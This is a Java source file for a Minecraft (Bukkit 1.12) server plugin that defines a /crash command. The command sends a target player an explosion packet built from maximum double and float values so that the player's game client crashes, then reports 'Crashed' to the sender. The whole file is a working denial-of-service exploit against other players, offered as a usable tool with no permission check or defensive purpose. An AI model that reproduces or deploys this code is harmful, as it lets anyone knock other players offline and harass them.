package net.inprogressing.System.commands;

import net.inprogressing.System.main.Main;
import net.minecraft.server.v1_12_R1.PacketPlayOutExplosion;
import net.minecraft.server.v1_12_R1.Vec3D;
import org.bukkit.Bukkit;
import org.bukkit.command.Command;
import org.bukkit.command.CommandExecutor;
import org.bukkit.command.CommandSender;
import org.bukkit.craftbukkit.v1_12_R1.entity.CraftPlayer;
import org.bukkit.entity.Player;

import java.util.Collections;

public class Crash implements CommandExecutor {
    @Override
    public boolean onCommand(CommandSender sender, Command command, String label, String[] args) {
        if (sender instanceof Player) {
            Player p = (Player) sender;
            if(args.length == 1){
                Player target = Bukkit.getPlayer(args[0]);
                if(target != null){
                    ((CraftPlayer)target).getHandle().playerConnection.sendPacket(new PacketPlayOutExplosion(
                            Double.MAX_VALUE, Double.MAX_VALUE, Double.MAX_VALUE, Float.MAX_VALUE, Collections.emptyList(),
                            new Vec3D(Double.MAX_VALUE, Double.MAX_VALUE, Double.MAX_VALUE)));
                    p.sendMessage(Main.publicprefix + "Crashed §6" + target.getName() + "§7.");
                } else {
                    p.sendMessage(Main.publicprefix + "The player §6" + args[0] + "§7 is not online.");
                }
            } else {
                p.sendMessage(Main.publicprefix + "Use /crash <player>");
            }
        }
        return false;
    }
}
